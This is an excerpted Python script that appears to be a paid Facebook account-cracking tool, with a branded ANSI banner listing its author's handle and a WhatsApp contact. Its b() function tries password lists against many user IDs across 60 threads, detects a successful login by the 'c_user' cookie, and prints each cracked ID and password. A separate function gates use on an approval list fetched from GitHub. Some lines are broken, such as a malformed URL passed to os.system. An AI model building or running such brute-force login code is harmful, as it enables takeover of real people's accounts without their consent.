...
\033[38;5;46m│ \033[1;97m[\033[31;1m<>\033[1;97m] \033[33;1m𝘈𝘜𝘛𝘏𝘖𝘙      \033[1;97m  :  \033[34;1m𝗡𝗜𝗛𝗔𝗡 \033[38;5;46m│ \033[33;1m│\033[38;5;46m\033[33;1m
\033[38;5;46m│ \033[1;97m[\033[31;1m<>\033[1;97m] \033[33;1m𝘎𝘐𝘛𝘏𝘜𝘉        \033[1;97m:  \033[34;1m 𝗚𝗫~𝗡𝗜𝗛𝗔𝗡\033[38;5;46m   │  \033[33;1m
\033[38;5;46m│ \033[1;97m[\033[31;1m<>\033[1;97m] \033[33;1m𝘞𝘏𝘈𝘛𝘚𝘈𝘗𝘗   \033[1;97m   :  \033[34;1m+8801981002555\033[38;5;46m│
\033[38;5;46m│ \033[1;97m[\033[31;1m<>\033[1;97m] \033[33;1m𝘗𝘖𝘞𝘌𝘙       \033[1;97m  :  \033[34;1m𝗚𝗫~𝗡𝗜𝗛𝗔𝗡 \033[38;5;46m│
...
def admin():
	...
	if bal =='1':
		...
		admin()
	if bal =='2':
		os.system('xdg-open https://https://www.facebook.com/soliman.https://www.facebook.com/profile.php?id=100089790850149&mibextid=ZbWKwL');time.sleep(1)
		admin()
	if bal =='0':
		Main()
...
def virusA():
	...
	with ThreadPool(max_workers=60) as yaari:
		os.system('https://www.facebook.com/profile.php?id=100089790850149&mibextid=ZbWKwL')
		print(logo)
		tl = str(len(user))
...
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mNIHAN-👿\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m [NIHAN-OK🔥] '+cid+' | '+ps+'\33[0;92m')
        ...
        pass
def superuser():
    UMO="NIHAN SIR PLEASE APPROVE"
    uuid = str(os.geteuid()) + str(os.getlogin()) 
    id = "5".join(uuid)
    print(logo)
    DARK=requests.get("https://github.com/NIHAN-404/Nihan12/edit/main/Nihan-approve.txt").text
    if id in DARK:
        Main()
    else:
        os.system("clear")
        ...
        print ("\n")
        os.system("espeak \"assalamualaikum.   ,I am    b.d.   robot   and my boss is  g.x.   nihan.sir.      this tool is paid because 100% ok id just now login\"")
